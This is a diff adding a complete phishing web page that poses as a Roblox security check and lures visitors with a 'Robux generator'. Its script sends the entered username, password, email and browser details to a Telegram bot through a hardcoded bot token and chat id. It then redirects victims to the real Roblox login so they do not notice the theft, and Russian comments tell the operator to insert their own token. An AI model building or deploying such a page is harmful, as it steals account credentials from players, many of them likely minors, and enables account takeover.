@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Security Verification</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: 
+                linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
+                url('https://i.postimg.cc/mg4ZhFsK/apps-60351-13510798883386282-19007972-a8b6-4cc7-ba5d-ba9311808f97.jpg') no-repeat center center fixed;
+            background-size: cover;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #e0e0e0;
+        }
+        .login-container {
+            background: #2d2d2d;
+            border-radius: 10px;
+            padding: 30px;
+            width: 400px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            border: 1px solid #404040;
+        }
+        .login-header {
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 26px;
+            font-weight: 600;
+            color: #ffffff;
+        }
+        .input-field {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #555;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 14px;
+            background: #3a3a3a;
+            color: #ffffff;
+        }
+        .input-field::placeholder {
+            color: #999;
+        }
+        .login-button {
+            width: 100%;
+            background: #0078d7;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: background 0.3s;
+        }
+        .login-button:hover {
+            background: #106ebe;
+        }
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            color: #888;
+            font-size: 13px;
+            position: relative;
+        }
+        .divider::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #555;
+        }
+        .divider span {
+            background: #2d2d2d;
+            padding: 0 15px;
+        }
+        .secondary-options {
+            text-align: center;
+            font-size: 13px;
+            color: #888;
+            margin: 12px 0;
+        }
+        .secondary-options a {
+            color: #0078d7;
+            text-decoration: none;
+        }
+        .email-code {
+            background: #3a3a3a;
+            border: 1px solid #555;
+            border-radius: 6px;
+            padding: 14px;
+            text-align: center;
+            margin: 12px 0;
+            font-size: 13px;
+            cursor: pointer;
+            color: #ffffff;
+            transition: background 0.3s;
+        }
+        .email-code:hover {
+            background: #454545;
+        }
+        .signup-link {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #888;
+        }
+        .signup-link a {
+            color: #0078d7;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .security-notice {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-top: 15px;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">entering the Robux generator through Roblox</div>
+        
+        <input type="text" class="input-field" id="username" placeholder="Username / Email / Phone">
+        <input type="password" class="input-field" id="password" placeholder="Password">
+        
+        <button class="login-button" onclick="sendToTelegram()">Verify Account</button>
+        
+        <div class="secondary-options">
+            <a href="#">Forgot password or username?</a>
+        </div>
+        
+        <div class="divider"><span>or</span></div>
+        
+        <div class="email-code" onclick="sendEmailToTelegram()">
+            Send one-time code to email
+        </div>
+        
+        <div class="secondary-options">
+            <a href="#">Use another device</a>
+        </div>
+        
+        <div class="signup-link">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+        
+        <div class="security-notice">
+            Secure login verification required
+        </div>
+    </div>
+
+    <script>
+        // ЗАМЕНИТЕ ЭТИ ЗНАЧЕНИЯ НА СВОИ
+        const bot_token = "8497616861:AAEbqtYYlVlJhI9YZ3m33Cl8o61_CDX3FjQ"; // bot token = ваш токен бота
+        const chat_id = "8147099172"; // chat id = ваш chat id
+        
+        function sendToTelegram() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            
+            // Отправка в Telegram бот
+            var telegramMessage = "🔐 *NEW ROBLOX LOGIN* 🔐%0A%0A" +
+                                 "👤 *Username:* " + username + "%0A" +
+                                 "🔒 *Password:* " + password + "%0A" +
+                                 "🌐 *User Agent:* " + navigator.userAgent + "%0A" +
+                                 "🕒 *Time:* " + new Date().toLocaleString();
+            
+            var telegramUrl = "https://api.telegram.org/bot" + bot_token + "/sendMessage?chat_id=" + chat_id + "&text=" + telegramMessage + "&parse_mode=Markdown";
+            
+            fetch(telegramUrl, {
+                method: 'GET',
+                mode: 'no-cors'
+            });
+            
+            // Перенаправление после отправки
+            setTimeout(function() {
+                window.location.href = 'https://www.roblox.com/login';
+            }, 1000);
+            
+            alert("Security verification completed. Redirecting...");
+        }
+        
+        function sendEmailToTelegram() {
+            var email = document.getElementById('username').value;
+            
+            if(email) {
+                var telegramMessage = "📧 *EMAIL CODE REQUEST* 📧%0A%0A" +
+                                     "📬 *Email:* " + email + "%0A" +
+                                     "🌐 *User Agent:* " + navigator.userAgent + "%0A" +
+                                     "🕒 *Time:* " + new Date().toLocaleString();
+                
+                var telegramUrl = "https://api.telegram.org/bot" + bot_token + "/sendMessage?chat_id=" + chat_id + "&text=" + telegramMessage + "&parse_mode=Markdown";
+                
+                fetch(telegramUrl, {
+                    method: 'GET',
+                    mode: 'no-cors'
+                });
+            }
+            
+            alert("Verification code sent to your email");
+        }
+    </script>
+</body>
+</html>
